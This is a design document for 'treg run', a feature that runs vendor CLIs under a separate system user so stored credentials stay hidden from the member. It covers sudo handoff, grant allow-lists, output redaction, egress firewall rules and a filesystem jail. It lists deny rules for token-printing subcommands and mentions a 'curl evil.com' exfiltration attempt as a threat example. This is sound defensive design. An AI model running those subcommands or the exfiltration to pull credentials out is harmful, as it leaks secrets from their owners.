---
title: Local CLI runs — run a vendor CLI as a dedicated user with a server-held credential (`treg run`)
status: shipped
sources:
  - src/treg/localrun.py
  - src/treg/egress.py
  - src/treg/fsjail.py
related:
  - interface/api.md
  - interface/cli.md
  - interface/env-import.md
  - interface/shell.md
  - architecture/auth-secrets.md
  - architecture/data-model.md
---

# Local CLI runs (`treg run --local`)

A member runs a vendor CLI (`stripe`, `gh`, `flyctl`, `gcloud`, …) on their own machine while the
credential stays in treg custody. The security goal: **no other program of the same user may read the
credential** while the CLI runs. Design + the full decision trail: `docs/CLI-RUN-PLAN.md`.

> `treg run` has a second tier — **`--server`** (Tier 0): the CLI runs on the registry server instead of
> the member's machine (`POST /run`, `runner.run_bundle`). This fragment covers the **`--local`** (default)
> tier; the dispatcher (`cli.cmd_run`) picks between them by flag.

## Why a dedicated user (the two dead ends, briefly)
Two cheaper ideas were tested on real Linux and rejected:
- **`PR_SET_DUMPABLE=0` before exec** — does NOT work: `execve` resets the flag, so the exec'd CLI is
  readable again.
- **Rootless bubblewrap** — does NOT work: you own the user namespace you create, so you can still read
  into it (it maps to your same uid).

Only running the CLI under a **genuinely different user id** hides its environment and memory from the
member (proven: a different-uid process's `/proc/<pid>/environ` is unreadable by the member; only root
can read it). So `treg run` runs the CLI as a dedicated **`treg-run`** system user — the MongoDB pattern.

## The flow
1. The member's `treg run <tool> -- <args>` (thin client) hands off to the `treg-run` user via
   `sudo -u treg-run <runner>`, passing the member's OWN treg token through the environment
   (`TREG_RUN_TOKEN/BASE/ORG`, preserved by the install-time sudoers rule). `sudo` connects the terminal,
   so input, output, signals, and exit code flow through naturally.
2. The **runner** (running as `treg-run`, `cmd_run_helper` → the hidden `__run-helper`) calls
   `POST /tools/{name}/grant` with the member's token, receives the credential, runs the CLI with it, and
   reports the outcome. **The vendor credential only ever exists under `treg-run`** — the member never
   holds it. Install (`treg setup-local-run`, once, as admin) creates the user, installs the runner, and
   adds a narrow sudoers rule allowing the member to run ONLY that runner as `treg-run` (never a shell).
3. Without that setup, `treg run` falls back to running as the member, **best-effort**, with a clear
   warning that strong isolation is not active. Windows is not covered yet.

**Isolation now works on macOS too, not just Linux.** `cmd_setup_local_run` + `_create_run_user` create the
`treg-run` user via `useradd` on Linux and via **`dscl`** on macOS (a hidden service account with a free
system uid from `_pick_macos_service_uid`), and `_run_local` hands off via `sudo -u treg-run` on **both**. A
different uid is what hides the credential: a member cannot read another uid's `/proc/<pid>/environ` (Linux)
nor its task port (`task_for_pid` is denied cross-uid on macOS, even for root on non-entitled processes). A
setup-time check warns if `treg` itself lives inside the member's `0700` home — `treg-run` can't traverse in
to exec it, so treg must be installed at a **system-accessible path** (the isolation working against its own
launcher).

The trade-off (inherent to a real boundary): the CLI runs as `treg-run`, so it cannot read the member's
**private** (owner-only) files or write files the member owns; it can still read world/group-readable
files. Commands that need the member's own private files or `localhost` are out of scope for the protected
mode.

## Server side — the grant (`localrun.py`, unchanged by the runner change)
`render_grant(tool, profile, db, http)` returns a delivery-agnostic list: `{"items": [{via:"env",
name, value} | {via:"argv", argv:[…]}], "ttl_seconds"}`. The runner applies each item to the CLI (env var
or command-line flag) under `treg-run`. An **oauth** secret is refreshed first (`oauth.ensure_fresh`) and
only the short-lived **leaf** is released: the inject entry's `secret_field` must be on an **allow-list**
(`_OAUTH_RELEASABLE_FIELDS` = `access_token`/`token`), so a grant can never hand out `refresh_token` or
`client_secret` — the re-mintable identity stays on the server (a Google-style blob that carries `token`
before treg's first refresh and `access_token` after is handled by falling back to the sibling key).
Values are `.strip()`ed.

**Which secret a grant may release (`render_grant` allow-list).** A grant only releases a secret that
BELONGS to this tool: one of its HTTP bindings' `secret_id`, a secret in the tool's own bundle
(`Secret.bundle_id == tool.bundle_id`), or a secret owned by the tool's owner (`secret.owner == tool.owner`)
— always same-org. Without this, a member could point an inject entry at ANOTHER user's secret id and read
its value (values are otherwise never returned).

**The runner-proof gate for SHARED keys.** The `/grant` endpoint distinguishes a call from the isolated
runner from a direct member call by the `X-Treg-Run-Proof` header (the value only treg-run can read, from
`/etc/treg-run/proof`, installed by `setup-local-run --run-proof` and exported as `TREG_RUN_PROOF`). A
member may always run a tool whose key they OWN; a SHARED key (one they don't own) is released only when the
valid proof is present — so a direct member `/grant` call can't extract a teammate's credential, but the
same key runs fine through the isolated runner. Without a proof installed, only owned-key tools run locally.
`effective_profile` merges the creator's `tool.cli` over the catalog profile (catalog never enables — only
`tool.cli.enabled` does; deny lists unioned unless `deny_defaults:false`; returned lists are copied so a
request can't mutate the module-level CATALOG). `check_deny` refuses a matching argv server-side, where the
secret lives. `validate_cli_profile` rejects a bad profile at write time — including dangerous env names
(`_is_dangerous_env`: `LD_*`, `PATH`, `NODE_OPTIONS`, …), a non-bare `bin` (`_BIN_RE`), a `format` without
`{secret}`, uncompilable patterns, oversized lists, and the auto-import metadata (`auth_mechanism` must be
one of `AUTH_MECHANISMS` = `env|argv|config_file|device`; `detect.config_paths` a list of non-empty strings;
`beta` a bool). `_resolve_secret_id` returns None for an ambiguous multi-credential tool with no explicit
mapping (so the grant fails loudly, never injects the wrong key).

**`auth_mechanism` splits the tiers.** `env`/`argv` are server-injectable (treg holds the key); `config_file`
(the CLI reads its own `~/.config`) and `device` are local-only. So `server_runnable` (api `_tool_view`) now
requires `auth_mechanism in (env, argv)` — a config_file/device CLI is surfaced as local-only and the
dashboard won't offer server-run for it. This field also drives `treg upload clis` routing (see
[env-import](../interface/env-import.md)).

## The local sandbox (defence in depth around the run)
The isolated uid hides the credential from the member. Three more layers stop it leaking *out* of the CLI:

**Output redaction (shared-key runs).** When the caller does NOT own the injected key, the grant endpoint
sets `redact_output` on the response (it reuses the same `needs_proof` decision). The client
`_StreamRedactor` (in `cli.py`, driven by `_run_helper`) then scrubs the injected value out of the CLI's
stdout/stderr before it reaches the terminal — boundary-safe (it retains `len(secret)-1` bytes between reads
so a value split across chunks is still caught). An owned-key run needs no scrub (you may see your own key)
and keeps a raw, unbuffered TTY.

**Deny rules for leaky subcommands.** Catalog CLIs carry `deny` patterns (in `providers.CATALOG`, enforced by
`check_deny` at grant, where the secret lives) that refuse features which would print the injected key or run
member code as `treg-run`: `gh extension`/`alias`/`auth token`/`--show-token`, `flyctl|turso auth token`,
`doppler|infisical run`, `doppler secrets download`, `infisical export`. A creator can loosen its own list via
`deny_defaults: false`.

**Empty-inject grants.** A self-authenticating local-tier CLI (auto-import: `gh`, `gcloud`, `vercel` — the
credential lives in the CLI's own config) injects NOTHING. `render_grant` returns `{items: [], ttl_seconds:
None}` for it (no `ValueError`), so the grant is valid and just returns the bin + audit. Auto-import stores an
**explicit `inject: []`** on the tool so `effective_profile`'s catalog merge can't re-add the catalog's inject
— the fix for a bug where `gh`'s catalog `GH_TOKEN` inject leaked back at grant time and failed to resolve.

## Egress allow-list — the network half of the sandbox
The isolated uid + redaction still leave one channel: a CLI feature that runs member code (a plugin, `doppler
run`) inherits the key and could `curl` it to an attacker — a leak neither redaction (it's on the network, not
stdout) nor deny (unknown features) fully stops. `src/treg/egress.py` closes it by restricting the
`treg-run` uid's **outbound network** to a fixed allow-list. Pure builders: `collect_hosts(registry, catalog)`
(the registry — so the runner can reach `/grant` — plus every catalog `base_url` host), `resolve_hosts`
(→ current IPv4/IPv6), `pf_ruleset` (macOS `pf` per-user `user treg-run` rules — verified: macOS pf honors the
`user` keyword + IP lists, so a rogue `curl evil.com` from that uid is dropped at the packet level while other
users are untouched), `nft_ruleset` (Linux nftables owner-match on `skuid`). `_install_egress` (in `cli.py`)
resolves + loads them now and persists them: macOS via a `LaunchDaemon` (`dev.treg.egress`) that re-runs a
root-owned loader (`/usr/local/bin/treg-egress-load`, which reloads Apple's ruleset + `/etc/treg-run/egress.pf`
at boot); Linux writes `/etc/treg-run/egress.nft`. Setup flags: `--no-egress` (opt out), `--registry` (the
host to allow-list; else the member's configured base_url), `--refresh-egress` (see below). This is Option 1 —
a **static** allow-list set once at setup; a per-run dynamic rule (Option 2) was rejected for complexity.

### Egress allow-list — refreshing the catalog IPs (IP rotation)
The static allow-list pins the IPs resolved **at install time**. Vendor and CDN IPs drift, so a catalog host
can rotate to a new IP that isn't on the list — a legitimate call then gets dropped (or a stale IP lingers,
harmlessly). The remedy is to **re-resolve**: `sudo treg setup-local-run --refresh-egress` re-runs
`collect_hosts` → `resolve_hosts` → `_install_egress` without touching the user/runner/sudoers. Operationally
this wants a periodic refresh (cron / launchd timer). **Open design question:** whether the catalog should
carry each provider's known IP ranges (stable, no per-machine DNS), or treg should ship an auto-refresh timer.
This churn is inherent to Option 1 (static IPs); it's the trade-off accepted against Option 2's per-run rules.

### Filesystem jail (`treg run --fs-jail`, opt-in)
The last channel: even with uid isolation + egress, a CLI feature running member code could WRITE the key
to a file the member then reads. `--fs-jail` confines the run's writes to a private per-run scratch (0700,
treg-run-owned, pointed at as `HOME`/`TMPDIR`), removed after the run. `src/treg/fsjail.py`: `macos_profile`
builds a seatbelt profile (`allow default`, then `deny file-write*` except the scratch subpath + `/dev/`);
`wrap_macos` prefixes `sandbox-exec -f <profile>`. `_run_helper` reads `TREG_RUN_FSJAIL` (forwarded by
`_run_local` through the sudoers `env_keep`) and applies it on macOS. OPT-IN because it also blocks a CLI
writing legitimate output files where the member wants them. Verified live on macOS: `touch /tmp/x` under
the jail → "Operation not permitted"; without it → the file is created. Linux (Landlock / mount ns) is a
follow-up — the builder exists, the wiring doesn't.

### Per-member gates (the access-control feature)
Before rendering a grant, `grant_local_run` also enforces the per-member ACL: `_require_tool_access` (the
member's `tool_access` must be NULL or name this tool) and `_require_local_run` (the member's
`local_run_enabled` must be true, else "run on the server instead"). Both gate the LOCAL tier; the tool ACL
also gates the proxy `call` + server `run`. Owner is exempt. See [multi-tenancy](multi-tenancy.md).

## Trust posture
The credential lives under `treg-run`, unreadable by the member's uid (only root can read any process).
Grants are member+ only (a viewer may call via the proxy — which leaks nothing — but not extract a value),
owner-opt-in per tool (`cli.enabled`), fully audited (grant/deny/report, argv redacted of key-shaped
tokens), and deny-checked server-side. The endpoints + the client live in [api](../interface/api.md) and
[cli](../interface/cli.md); catalog profiles in [env-import](../interface/env-import.md).
